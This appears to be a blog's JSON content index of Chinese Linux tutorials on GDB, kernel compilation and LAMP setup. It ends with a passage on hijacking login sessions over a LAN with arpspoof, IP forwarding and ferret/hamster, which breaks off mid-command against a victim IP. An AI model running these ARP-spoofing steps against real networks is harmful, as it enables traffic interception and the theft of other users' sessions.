class=\"keyword\">update</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"II、安装Insight-Debugger\"><a href=\"#II、安装Insight-Debugger\" class=\"headerlink\" title=\"II、安装Insight Debugger\"></a>II、安装Insight Debugger</h1><p>在终端输入：<br><figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> install insight</div></pre></td></tr></table></figure></p>\n<h1 id=\"III、验证安装\"><a href=\"#III、验证安装\" class=\"headerlink\" title=\"III、验证安装\"></a>III、验证安装</h1><p>现在感受下Insight Debugger<br>启动：</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1es4yarfwcej30db00jt8j.jpg\" alt=\"\"></p>\n<p>图像化界面：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1es4yazd31yj30jg0f4djx.jpg\" alt=\"\"><br>OK！！ Insight Debugger已经安装成功了，大家慢慢享受其中的奥妙</p>\n<h1 id=\"IV、参考文献\"><a href=\"#IV、参考文献\" class=\"headerlink\" title=\"IV、参考文献\"></a>IV、参考文献</h1><p><a href=\"http://baptiste-wicht.com/posts/2012/01/install-insight-debugger-linux-mint-ubuntu.html#\" target=\"_blank\" rel=\"external\">Install the Insight Debugger on Linux Mint (works for Ubuntu too)</a></p>\n"},{"title":"GDB常用命令","url":"http://huirong.github.io/2015/04/30/gdbDebug/","content":"<p>调试器（比如GDB）能让你观察另一个程序在执行时的内部活动，或程序出错时发生了什么。<br><a id=\"more\"></a></p>\n<h1 id=\"I、GDB简介\"><a href=\"#I、GDB简介\" class=\"headerlink\" title=\"I、GDB简介\"></a>I、GDB简介</h1><p>GDB主要能为你做四件事(包括为了完成这些事而附加的功能)，帮助你找出程序中的错误。</p>\n<ul>\n<li>运行你的程序，设置所有的能影响程序运行的东西。</li>\n<li>保证你的程序在指定的条件下停止。</li>\n<li>当你程序停止时，让你检查发生了什么。</li>\n<li>改变你的程序。那样你可以试着修正某个bug引起的问题，然后继续查找另一 个bug。<br>你可以用GDB来调试C和C++写的程序。</li>\n</ul>\n<p><strong>先说明一下</strong>如何取得包括原代码符号的可执行代码。大家有心的话可以去看一下gcc的man文件在shell下打man gcc)。 gcc -g &lt;原文件.c&gt; -o &lt;要生成的文件名&gt;<br>-g 的意思是生成带原代码调试符号的可执行文件。<br>-o 的意思是指定可执行文件名。<br>(gcc 的命令行参数有一大堆，有兴趣可以自己去看看。) </p>\n<h1 id=\"II、GDB命令\"><a href=\"#II、GDB命令\" class=\"headerlink\" title=\"II、GDB命令\"></a>II、GDB命令</h1><h2 id=\"①-启动\"><a href=\"#①-启动\" class=\"headerlink\" title=\"① 启动\"></a>① <font color=\"orange\">启动</font></h2><ul>\n<li>gdb $program<br>program就是你的执行文件，一般在当前目录下</li>\n<li>gdb $program core<br>用gdb同时调试一个运行程序和core文件，core是程序非法执行后core dump后产生的文件。</li>\n<li>gdb $program $pid<br>如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。</li>\n</ul>\n<h2 id=\"②-运行\"><a href=\"#②-运行\" class=\"headerlink\" title=\"② 运行\"></a>② <font color=\"orange\">运行</font></h2><ul>\n<li>r ：运行程序</li>\n<li>continue/c ：继续运行</li>\n<li>next/n ：下一行，但不进入函数调用</li>\n<li>stop/s ：下一行，且进入函数调用</li>\n<li>ni 或 si ：下一跳指令，ni与si的区别同n与s的区别</li>\n<li>finish/fini ：继续运行至当前栈帧/函数刚刚退出</li>\n<li>until/u ：  继续运行至某一行，在循环中，u可以实现运行至循环刚刚退出，但这取决于循环的实现</li>\n</ul>\n<h2 id=\"③-查看源码\"><a href=\"#③-查看源码\" class=\"headerlink\" title=\"③ 查看源码\"></a>③ <font color=\"orange\">查看源码</font></h2><ul>\n<li>list/l linenum/function ：查看第linenum行或者function所在行附近的10行</li>\n<li>list/l ：查看上一次list命令列出的代码后面的10行</li>\n<li>list/l m,n ：查看从第m行到第n行的源码</li>\n</ul>\n<h2 id=\"④-断点\"><a href=\"#④-断点\" class=\"headerlink\" title=\"④ 断点\"></a>④ <font color=\"orange\">断点</font></h2><ul>\n<li>break/b linenum/function ：在第linenum行或函数function处停住</li>\n<li>break/b +/-offset ：在当前行号的前面/后面的offset行停住，offset为自然数</li>\n<li>break filename:linenum ：在源文件filename的linenum行处停住</li>\n<li>break filename:function ：在源文件filename的function函数入口处停住</li>\n<li>break *address ：在程序运行的内存地址处停住</li>\n<li>break ：break没有参数时，表示在吓一跳指令处停住</li>\n</ul>\n<p>查看断点</p>\n<ul>\n<li>info break</li>\n</ul>\n<h2 id=\"⑤-查看寄存器\"><a href=\"#⑤-查看寄存器\" class=\"headerlink\" title=\"⑤ 查看寄存器\"></a>⑤ <font color=\"orange\">查看寄存器</font></h2><ul>\n<li>info registers ：查看寄存器的情况（除了浮点寄存器）</li>\n<li>info all-registers ：查看所有寄存器的情况</li>\n<li>info registers $regname  ：查看制定寄存器的情况，例如 info $rbp</li>\n</ul>\n<p>修改寄存器的值</p>\n<ul>\n<li>set $regname value ：改变指定寄存器的值，例如 set $rbx 0x5</li>\n</ul>\n<h2 id=\"⑥-查看变量的值\"><a href=\"#⑥-查看变量的值\" class=\"headerlink\" title=\"⑥ 查看变量的值\"></a>⑥ <font color=\"orange\">查看变量的值</font></h2><ul>\n<li>p varable ：打印变量varable的值</li>\n<li>p &amp;varable ：打印变量varable的地址</li>\n</ul>\n<h2 id=\"⑦-查看帧栈信息\"><a href=\"#⑦-查看帧栈信息\" class=\"headerlink\" title=\"⑦ 查看帧栈信息\"></a>⑦ <font color=\"orange\">查看帧栈信息</font></h2><p>查看调用栈</p>\n<ul>\n<li>backtrace/bt ：显示程序的调用栈信息</li>\n<li>backtrace/bt n ：显示程序的调用栈信息，只显示栈顶n帧</li>\n</ul>\n<p>查看帧信息</p>\n<ul>\n<li>frame/f n ：查看第n帧的信息</li>\n<li>frame/f addr ：查看pc地址为addr的帧的相关信息</li>\n<li>up n ：查看当前帧上面第n帧的信息</li>\n<li>down n ：查看当前帧下面第n帧的信息</li>\n</ul>\n<p>查看更新详细的信息</p>\n<ul>\n<li>info frame、info frame n、info frame addr  查看制定帧的详细信息</li>\n<li>info args ：查看当前帧中的参数</li>\n<li>info locals ：查看当前帧中的局部变量</li>\n<li>info catch ：查看当前帧中的异常处理器</li>\n</ul>\n<h2 id=\"⑧-退出\"><a href=\"#⑧-退出\" class=\"headerlink\" title=\"⑧ 退出\"></a>⑧ <font color=\"orange\">退出</font></h2><ul>\n<li>quit/q ：退出GDB调试，若退出时被调试的程序尚未结束，GDB会提示，请求确认</li>\n</ul>\n<p>目前只用过这些命令，以后会持续更新。。。。。</p>\n<p>#参考文献<br><a href=\"http://blog.csdn.net/dadalan/article/details/3758025\" target=\"_blank\" rel=\"external\">比较全面的gdb调试命令</a><br><a href=\"http://www.dutor.net/index.php/2011/02/gdb-summary/\" target=\"_blank\" rel=\"external\">GDB使用小结</a><br><a href=\"http://www.wuzesheng.com/?p=1409\" target=\"_blank\" rel=\"external\">手把手教你玩转GDB(四)——–函数调用栈(call stack)探密</a></p>\n"},{"title":"编译内核基础知识","url":"http://huirong.github.io/2015/04/22/Kernel/","content":"<p>在进行内核编译前，了解这些基础知识有助于你了解编译过程的每一步。。。<br><a id=\"more\"></a></p>\n<h1 id=\"I、什么是内核\"><a href=\"#I、什么是内核\" class=\"headerlink\" title=\"I、什么是内核\"></a>I、什么是内核</h1><p>计算机真正在工作的东西其实都是“硬件”，例如数值运算要使用到CPU，数据存储要使用到硬盘，图形显示要使用到网卡等。那么如何控制这些硬件呢？那就是内核的工作了！也就是说，你所希望计算机帮你达成的各项工作都需要通过“内核”的帮助才行。<br>那么内核到底是什么呢？<strong>其实内核就是系统上面的一个文件而已，这个文件包含了驱动主机各项硬件的监测程序与驱动模块。</strong>当系统读完BIOS并加载MBR内的引导转载程序后，就能加载内核到内存。然后内核开始监测硬件，挂在跟目录并取得内核模块来驱动所有的硬件，之后条用/sbin/init 就能都一次启动所有系统所需要的服务了。</p>\n<h1 id=\"II、内核编译\"><a href=\"#II、内核编译\" class=\"headerlink\" title=\"II、内核编译\"></a>II、内核编译</h1><p>上面提到，内核就是一个文件，那么这个文件是怎么来的？当然是通过源代码编译而成的！因为内核是直接被读入到内存中的，所以当然要讲他编译成为系统可以认识的数据才行！</p>\n<h1 id=\"III、内核编译的目的\"><a href=\"#III、内核编译的目的\" class=\"headerlink\" title=\"III、内核编译的目的\"></a>III、内核编译的目的</h1><ul>\n<li>新功能的需求<br>我需要新的功能，而这个功能只有在新的内核里面才有。那么为了获得这个功能，只好来重新编译我们的内核了</li>\n<li>远内核太过臃肿</li>\n<li>其他需求<br>比如你需要特殊的环境需求时，就得自行设计你的内核了！</li>\n</ul>\n<h1 id=\"IV、内核版本\"><a href=\"#IV、内核版本\" class=\"headerlink\" title=\"IV、内核版本\"></a>IV、内核版本</h1><p>内核版本的格式 “[主].[次].[发布]-[修改]”，次版本号为偶数是稳定版，奇数是测试版。我们要使用最新的内核来重新编译内核时，大多就是使用那种偶数的内核版本。<br><strong>注意：3.14.x和3.18.x是两个具有相当大差异的内核版本，两者之间使用到的函数库基本上已经不相同了，所以在审计之前，如果你的内核版本是3.14.xx，那么就升级到3.14.xx的最新本，不要有3.14.xx直接升级到3.18.xx版，否则可能会欲哭无泪。</strong></p>\n"},{"title":"Linux编译内核步骤","url":"http://huirong.github.io/2015/04/21/compileKernel/","content":"<p>题记：如果你想了解关于编译内核的基础知识：内核的定义、内核编译、内核编译的目的、内核版本的选择，请参考我的另一篇博客 <a href=\"http://localhost:4000/2015/04/22/Kernel/\" target=\"_blank\" rel=\"external\">编译内核基础知识</a><br><a id=\"more\"></a></p>\n<h1 id=\"I、准备工作\"><a href=\"#I、准备工作\" class=\"headerlink\" title=\"I、准备工作\"></a>I、准备工作</h1><p>由于系统中没有图形界面配置工具ncurses，因此首先下载此工具安装包，然后在终端打开工具所在目录，切换到root用户下，输入以下命令：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar zxvf ncurses-<span class=\"number\">5.9</span><span class=\"selector-class\">.tar</span><span class=\"selector-class\">.gz</span></div><div class=\"line\">cd ncurses-<span class=\"number\">5.9</span></div><div class=\"line\">./configure</div><div class=\"line\">make</div><div class=\"line\">make install</div></pre></td></tr></table></figure></p>\n<p>这样就安装好了ncurses，可以使用了</p>\n<h1 id=\"II、下载内核\"><a href=\"#II、下载内核\" class=\"headerlink\" title=\"II、下载内核\"></a>II、下载内核</h1><ul>\n<li>到官网下载内核版本 <a href=\"http://www.kernel.org\" target=\"_blank\" rel=\"external\">http://www.kernel.org</a>，我下载的是 linux-3.14.39</li>\n<li>打开终端，切换到root用户，输入 su ，然后输入密码即可</li>\n<li><p>将下载的linux-3.14.39.tar.xz 移动到/usr/src/ 目录下</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">mv linux-<span class=\"number\">3.14</span>.<span class=\"number\">39</span><span class=\"selector-class\">.tar</span><span class=\"selector-class\">.xz</span> /usr/src</div></pre></td></tr></table></figure>\n</li>\n<li><p>进入/usr/src/目录下，解压缩内核压缩包</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">xz</span> <span class=\"selector-tag\">-d</span> <span class=\"selector-tag\">linux-3</span><span class=\"selector-class\">.14</span><span class=\"selector-class\">.39</span><span class=\"selector-class\">.tar</span><span class=\"selector-class\">.xz</span></div><div class=\"line\"><span class=\"selector-tag\">tar</span> <span class=\"selector-tag\">-xvf</span> <span class=\"selector-tag\">linux-3</span><span class=\"selector-class\">.14</span><span class=\"selector-class\">.39</span><span class=\"selector-class\">.tar</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"III、编译内核\"><a href=\"#III、编译内核\" class=\"headerlink\" title=\"III、编译内核\"></a>III、编译内核</h1><h2 id=\"①-清理内核中的残渣\"><a href=\"#①-清理内核中的残渣\" class=\"headerlink\" title=\"① 清理内核中的残渣\"></a>① 清理内核中的残渣</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd /usr/src/linux<span class=\"number\">-3.14</span><span class=\"number\">.39</span></div><div class=\"line\">make mrproper</div></pre></td></tr></table></figure>\n<h2 id=\"②-配置内核\"><a href=\"#②-配置内核\" class=\"headerlink\" title=\"② 配置内核\"></a>② 配置内核</h2><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">make menuconfig</span></div></pre></td></tr></table></figure>\n<p>出现图形化界面<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1ereo9ppwjcj30ke0dmwg9.jpg\" alt=\"\"><br>说一下配置：<br>对每一个配置选项，用户有三种选择，它们分别代表的含义如下：<br>&lt;<em>&gt;或[</em>]——将该功能编译进内核<br>[]——不将该功能编译进内核<br>[M]——将该功能编译成可以在需要时动态插入到内核中的代码</p>\n<p>使用空格键进行切换<br>配置完之后，保存退出</p>\n<h2 id=\"③-配置完之后，开始编译内核\"><a href=\"#③-配置完之后，开始编译内核\" class=\"headerlink\" title=\"③ 配置完之后，开始编译内核\"></a>③ 配置完之后，开始编译内核</h2><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">make</span></div></pre></td></tr></table></figure>\n<p>这一步需要很长时间，请耐心等待。。。。。。。。</p>\n<h2 id=\"④-编译内核模块\"><a href=\"#④-编译内核模块\" class=\"headerlink\" title=\"④ 编译内核模块\"></a>④ 编译内核模块</h2><figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">make</span> modules_install</div><div class=\"line\"><span class=\"built_in\">make</span> install</div></pre></td></tr></table></figure>\n<h1 id=\"IV、修改启动程序配置\"><a href=\"#IV、修改启动程序配置\" class=\"headerlink\" title=\"IV、修改启动程序配置\"></a>IV、修改启动程序配置</h1><ol>\n<li><p>将生成的bzImage文件和System.map文件拷贝到/boot/目录下</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cp <span class=\"regexp\">/usr/</span>src<span class=\"regexp\">/linux-3.12.6/</span>arch<span class=\"regexp\">/x86/</span>boot<span class=\"regexp\">/bzImage /</span>boot/</div><div class=\"line\">cp <span class=\"regexp\">/usr/</span>src<span class=\"regexp\">/linux-3.12.6/</span>System.map <span class=\"regexp\">/boot/</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>查看启动项</p>\n<ul>\n<li>更新系统引导配置，不同系统命令不一样，大家自行google</li>\n<li>查看配置文件<br>配置文件在/boot/grub2/grub.cfg<br>gedit /boot/grub2/grub.cfg<br>看到配置文件中有如下内容，说明内核已经添加到启动项了<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1ereo9y7ugkj30i70es760.jpg\" alt=\"\"></li>\n</ul>\n<p>OK，编译内核已经全部完成，可以重启电脑了。。。。。<br>如果没有必要不要编译内核，需要很久啊O(∩_∩)O</p>\n</li>\n</ol>\n<h1 id=\"V、参考文献\"><a href=\"#V、参考文献\" class=\"headerlink\" title=\"V、参考文献\"></a>V、参考文献</h1><p><a href=\"http://mzqthu.iteye.com/blog/2001167\" target=\"_blank\" rel=\"external\">linux内核编译步骤（详细全过程）</a></p>\n"},{"title":"在Ubuntu上安装LAMP服务器并简单配置","url":"http://huirong.github.io/2015/04/01/installLamp/","content":"<p>我在DigitalOcean上有个Linux服务器，想把下载的项目挂在上面，就得安装一个LAMP服务器，一个个安装Appach、MySql、PHP太麻烦了，就安装个集成的。<br><a id=\"more\"></a></p>\n<h1 id=\"I、在Ubuntu上安装LAMP\"><a href=\"#I、在Ubuntu上安装LAMP\" class=\"headerlink\" title=\"I、在Ubuntu上安装LAMP\"></a>I、在Ubuntu上安装LAMP</h1><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get <span class=\"keyword\">install</span> lamp-<span class=\"keyword\">server</span>^</div></pre></td></tr></table></figure>\n<p>最后那个符号^不要少，不然不能正确执行</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqrk4ytavkj30ir0btwf0.jpg\" alt=\"\"></p>\n<p>在安装的过程中，系统会提示你为MySQL的根用户输入密码<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqrk5ocd04j30ir0btjtb.jpg\" alt=\"\"><br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eqrk5wgf77j30ir0bt0ts.jpg\" alt=\"\"><br>密码设置成功后，会继续安装一部分文件，等待一会，就OK了</p>\n<h1 id=\"II、修改-Apache-根目录\"><a href=\"#II、修改-Apache-根目录\" class=\"headerlink\" title=\"II、修改 Apache 根目录\"></a>II、修改 Apache 根目录</h1><p>Ubuntu安装Apache后，默认的根目录是 /var/www/html，让我很不习惯，处女座的毛病犯了，就想修改配置文件<br>Apache有多个配置文件，设置根目录的配置文件，位于 /etc/apache2/sites-available下的 000-default.conf<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eqrk8zquefj30i6038q3w.jpg\" alt=\"\"></p>\n<p>将 DocumentRoot的值 由 /var/www/html  改为 /var/www/<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqrk7ntvbgj30ir0btq6u.jpg\" alt=\"\"></p>\n<font color=\"red\">最后将/var/www/html/下的index.php文件移动到 /var/www/，这样才能正常显示主页了,因为根目录已经变了</font>\n\n<h1 id=\"III、测试\"><a href=\"#III、测试\" class=\"headerlink\" title=\"III、测试\"></a>III、测试</h1><h2 id=\"①-测试Apache\"><a href=\"#①-测试Apache\" class=\"headerlink\" title=\"① 测试Apache\"></a>① 测试Apache</h2><p>打开浏览器，输入网址<a href=\"http://localhost/或者http://YOUR_IP，会看到如下提示\" target=\"_blank\" rel=\"external\">http://localhost/或者http://YOUR_IP，会看到如下提示</a><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqrkadel6gj30nx08btcs.jpg\" alt=\"\"><br>OK，Apache正常！！！！</p>\n<h2 id=\"②-测试php\"><a href=\"#②-测试php\" class=\"headerlink\" title=\"② 测试php\"></a>② 测试php</h2><p>在/var/www中创建一个testing.php文件，内容可以自定义，我使用的终端命令：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">echo \"<span class=\"php\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span>\" | sudo tee /var/www/testing.php</div></pre></td></tr></table></figure></p>\n<p>然后重启Apache服务<br><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">service apache2 <span class=\"built_in\">restart</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqrk655v8wj30il04bwfm.jpg\" alt=\"\"><br>在浏览器中，输入网址<a href=\"http://localhost/testing.php或http://YOUR_IP/testing.php\" target=\"_blank\" rel=\"external\">http://localhost/testing.php或http://YOUR_IP/testing.php</a>   可以看到安装的PHP信息<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqrk9sw2r9j30jc097myl.jpg\" alt=\"\"></p>\n<h2 id=\"③-配置MySQL\"><a href=\"#③-配置MySQL\" class=\"headerlink\" title=\"③ 配置MySQL\"></a>③ 配置MySQL</h2><p>需要将MySQL绑定到本地主机IP地址，默认情况下，这个地址应该是 127.0.0.1，为了以防万一，还是确认一下<br><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">cat <span class=\"regexp\">/etc/</span>hosts | <span class=\"keyword\">grep</span> localhost</div></pre></td></tr></table></figure></p>\n<p>会看到如下内容<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqrkar0vq0j30b501fjri.jpg\" alt=\"\"><br>然后确定MySQL的conf文件<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">cat</span> /etc/mysql/my.<span class=\"keyword\">cnf</span> | <span class=\"keyword\">grep</span> bind-address</div></pre></td></tr></table></figure></p>\n<p>会看到如下内容<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqrkb4yn7qj30du00ydfz.jpg\" alt=\"\"><br>MySQL配置OK了。。。</p>\n<h1 id=\"IV、安装phpMyAdmin\"><a href=\"#IV、安装phpMyAdmin\" class=\"headerlink\" title=\"IV、安装phpMyAdmin\"></a>IV、安装phpMyAdmin</h1><p>phpMyAdmin图形化的界面，帮助我们方便的管理数据库。<br><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-<span class=\"keyword\">get</span> install libapache2-<span class=\"keyword\">mod</span>-auth-mysql phpmyadmin</div></pre></td></tr></table></figure></p>\n<p>接下来，系统会提示你选择为phpMyAdmin配置的Web服务器，使用键盘上的箭头键。高亮apache2，然后回车<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqrkbcj30zj30ir0bttaa.jpg\" alt=\"\"><br>询问是否为phpMyAdmin配置一个名为dbconfig-common的数据库，选择 yes，回车<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1eqrkbjqo3vj30ir0btn0o.jpg\" alt=\"\"><br>然后输入之前设置的数据库密码，并确认密码</p>\n<h1 id=\"V、配置Apache服务器\"><a href=\"#V、配置Apache服务器\" class=\"headerlink\" title=\"V、配置Apache服务器\"></a>V、配置Apache服务器</h1><p>如果此时在浏览器中输入<a href=\"http://localhost/phpmyadmin，会提示404错误\" target=\"_blank\" rel=\"external\">http://localhost/phpmyadmin，会提示404错误</a><br>此时应该进行简单的配置，将phpMyAdmin的配置文件，复制到Apache2下<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">cp</span> /etc/phpmyadmin/apache.<span class=\"keyword\">conf</span> /etc/apache2/<span class=\"keyword\">conf</span>-enabled/phpmyadmin.<span class=\"keyword\">conf</span></div></pre></td></tr></table></figure></p>\n<p>然后重启Apache服务器<br><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">service apache2 <span class=\"built_in\">restart</span></div></pre></td></tr></table></figure></p>\n<p>现在可以正常访问<a href=\"http://localhost/phpmyadmin\" target=\"_blank\" rel=\"external\">http://localhost/phpmyadmin</a> 页面了<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1eqrkbxvqrnj30hm0fk0tk.jpg\" alt=\"\"><br>输入 root和之前设置的数据库密码进行登录<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1eqrkc938j9j30o20ckwgf.jpg\" alt=\"\"></p>\n<p>恭喜你，成功完成Ubuntu下安装和配置LAMP和phpMyAdmin了，现在可以在上面搭建自己的网站了。。。。。。</p>\n<h1 id=\"Ⅵ、参考文献\"><a href=\"#Ⅵ、参考文献\" class=\"headerlink\" title=\"Ⅵ、参考文献\"></a>Ⅵ、参考文献</h1><ul>\n<li><a href=\"http://os.51cto.com/art/201307/405333_all.htm\" target=\"_blank\" rel=\"external\">如何在Ubuntu上安装LAMP服务器系统？</a></li>\n<li><a href=\"http://blog.csdn.net/fengguowuhen7871/article/details/8843241\" target=\"_blank\" rel=\"external\">Ubuntu Apache 根目录的更改方法</a></li>\n<li><a href=\"https://www.digitalocean.com/community/questions/i-cannot-access-phpmyadmin-on-ubuntu-14-04\" target=\"_blank\" rel=\"external\">I cannot access phpMyAdmin on Ubuntu 14.04</a></li>\n</ul>\n"},{"title":"kali利用Arpspoof、tcpdump、ferret和hamster劫持登录会话","url":"http://huirong.github.io/2015/03/25/arpspoof/","content":"<p>上篇博客讲解了ARP欺骗的原理<a href=\"http://huirong.github.io/2015/03/25/arp/\">http://huirong.github.io/2015/03/25/arp/</a>，不懂的可以自行google，网上有很多教程。<br>这次讲解利用ARP欺骗劫持登录会话<br><a id=\"more\"></a></p>\n<h1 id=\"I、环境\"><a href=\"#I、环境\" class=\"headerlink\" title=\"I、环境\"></a>I、环境</h1><h2 id=\"①-拓扑环境\"><a href=\"#①-拓扑环境\" class=\"headerlink\" title=\"① 拓扑环境\"></a>① 拓扑环境</h2><ul>\n<li>攻击机：Kali Linux IP：192.168.1.118</li>\n<li>受害机：Win7   IP：192.168.1.131</li>\n<li>网关IP：192.168.1.1</li>\n<li>攻击工具：arpspoof、tcpdump、ferret、hamster<br>前三款工具已经集成在Kali中了，ferret需要手动安装<h2 id=\"②-安装ferret\"><a href=\"#②-安装ferret\" class=\"headerlink\" title=\"② 安装ferret\"></a>② 安装ferret</h2>首先kali 64bit默认不安装ferret，需要自己解决。我之前是apt-get install ferret安装的，执行后会弹出一个对话框，也无法生成hamster.txt，费解多时，因为此ferret非我们需要的ferret。</li>\n</ul>\n<ol>\n<li><p>修改source.list中的内容，如下所示：</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">## Regular repositories</span></div><div class=\"line\">deb <span class=\"keyword\">http</span>://<span class=\"keyword\">http</span>.kali.org/kali kali main non-free contrib</div><div class=\"line\">deb <span class=\"keyword\">http</span>://security.kali.org/kali-security kali/updates main contrib non-free</div><div class=\"line\"><span class=\"comment\">## Source repositories</span></div><div class=\"line\">deb-src <span class=\"keyword\">http</span>://<span class=\"keyword\">http</span>.kali.org/kali kali main non-free contrib</div><div class=\"line\">deb-src <span class=\"keyword\">http</span>://security.kali.org/kali-security kali/updates main contrib non-free</div></pre></td></tr></table></figure>\n</li>\n<li><p>添加对32为的支持</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dpkg <span class=\"comment\">--add-architecture i386</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>更新</p>\n<figure class=\"highlight processing\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-<span class=\"built_in\">get</span> clean &amp;&amp; apt-<span class=\"built_in\">get</span> update &amp;&amp; apt-<span class=\"built_in\">get</span> upgrade -y &amp;&amp; apt-<span class=\"built_in\">get</span> <span class=\"built_in\">dist</span>-upgrade -y</div></pre></td></tr></table></figure>\n</li>\n<li><p>先删除原来的ferret</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">aptitude <span class=\"built_in\">remove</span> ferret</div></pre></td></tr></table></figure>\n</li>\n<li><p>安装我们需要的feret</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">aptitude <span class=\"keyword\">install</span> ferret-sidejack:i386</div></pre></td></tr></table></figure>\n</li>\n</ol>\n<h1 id=\"II、开始攻击\"><a href=\"#II、开始攻击\" class=\"headerlink\" title=\"II、开始攻击\"></a>II、开始攻击</h1><h2 id=\"①-打开路由转发\"><a href=\"#①-打开路由转发\" class=\"headerlink\" title=\"① 打开路由转发\"></a>① 打开路由转发</h2><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">echo <span class=\"string\">\"1\"</span> &gt; <span class=\"regexp\">/proc/</span>sys<span class=\"regexp\">/net/i</span>pv4<span class=\"regexp\">/ip_forward</span></div></pre></td></tr></table></figure>\n<p>linux下开启路由转发功能，可以让linux机器作为一个路由器来工作，将受害主机的数据包发送给网关。如果不开启此功能，受害主机的将会断网，这就是ARP断网攻击。<br>系统重启后，恢复原来的配置，只是临时生效</p>\n<h2 id=\"②-ARP欺骗\"><a href=\"#②-ARP欺骗\" class=\"headerlink\" title=\"② ARP欺骗\"></a>② ARP欺骗</h2><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">arpspoof</span> <span class=\"selector-tag\">-i</span> <span class=\"selector-tag\">wlan0</span> <span class=\"selector-tag\">-t</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.131</span> 